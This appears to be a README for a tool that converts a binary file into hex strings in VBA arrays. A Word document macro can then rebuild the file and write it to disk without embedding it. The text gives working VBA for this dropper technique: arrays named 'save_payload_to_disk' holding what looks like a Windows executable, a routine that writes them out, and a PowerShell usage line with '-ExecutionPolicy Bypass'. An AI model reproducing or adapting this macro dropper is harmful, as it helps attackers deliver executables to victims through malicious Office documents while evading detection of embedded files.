## file to vba array
Takes the hexdump of a file and places it into VBA arrays. This allows e.g. a word document to contain a binary file without embedding one. Instead it just creates it by writing the hex data to disk. Because of VBA's limitation on procedure size it will split the file into multiple functions if needed.

```vb
Sub save_payload_to_disk_1(filePath As String)
    Dim hexDataArray(1 To 2500) As String
    hexDataArray(1) = "4D5A90000300000004000000FFFF0000B80000"
    hexDataArray(2) = "00000000004000000000000000000000000000"
    hexDataArray(3) = "24200F437424202BF00374243085F67E258B1D"

    ...
    
    hexDataArray(2500) = "50FFD383C40885F67E068B442414EBE70FB744"

    write_to_disk filePath, hexDataArray
End Sub

Sub save_payload_to_disk_2(filePath As String)
    Dim hexDataArray(1 To 420) As String
    hexDataArray(1) = "8D46FF89028B571C8B028D4802890A668B00E9"
    hexDataArray(2) = "79010000837F5000750AB8FFFF0000E9690100"
    hexDataArray(3) = "6A00E8E5110000FF7750FFD383C40483F8FF0F"

    ...

    hexDataArray(420) = "F8017E3883F8030F85EE000000837C24300272"

    write_to_disk filePath, hexDataArray
End Sub
```

write_to_disk can then look something like this:

```vb
Sub write_to_disk(filePath As String, hexDataArray() As String)
    Dim i As Integer
    Dim j As Integer
    Dim data As String
    Dim hexData As String

    For i = LBound(hexDataArray) To UBound(hexDataArray)
        hexData = hexDataArray(i)
        data = ""

        ' Convert each hex string in the array to binary data
        For j = 1 To Len(hexData) Step 2
            data = data & Chr(CLng("&H" & Mid(hexData, j, 2)))
        Next j

        Open filePath For Binary Access Write As #1
            Seek #1, LOF(1) + 1 ' Write data to the end of the file
            Put #1, , data
        Close #1
    Next i
End Sub
```

### How to use
* PowerShell -ExecutionPolicy Bypass -File file_to_vba_array.ps1 -filePath "PATH_TO_BINARY" -outputPath "result.txt"